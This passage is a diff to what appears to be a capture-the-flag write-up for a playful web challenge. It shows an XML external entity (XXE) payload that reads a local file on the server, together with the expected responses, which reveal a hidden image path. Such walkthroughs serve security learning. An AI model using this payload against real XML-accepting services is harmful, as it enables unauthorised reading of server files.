@@ -240,3 +240,31 @@ Accept-Encoding: gzip, deflate
   <reqType>xml</reqType>
 </root>
 ```
+- Don't forget to change *Content-Type* and *<reqType>* to xml.
+- The response should look like this:
+```json
+{
+  "appResp": "I love rings of all colors!^She definitely tries to convince everyone that the blue ones are her favorites. I'm not so sure though.",
+  "droppedOn": "none",
+  "visit": "none"
+}
+```
+- Let's put some payload here. [Hacktricks XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file).
+- I *ehm ehm... figured* the path using the WORDS we wrote above, the website structure and file extension using the *SIMPLE FORMAT* hint. Yeah... that's just it.
+```xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt"> ]>
+<root>
+  <imgDrop>&xxe;</imgDrop>
+  <who>princess</who>
+  <reqType>xml</reqType>
+</root>
+```
+- The response should look like this:
+```json
+{
+  "appResp": "Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don't keep any secrets in it any more! Please though, don't tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)",
+  "droppedOn": "none",
+  "visit": "static/images/pholder-morethantopsupersecret63842.png,262px,100px"
+}
+```
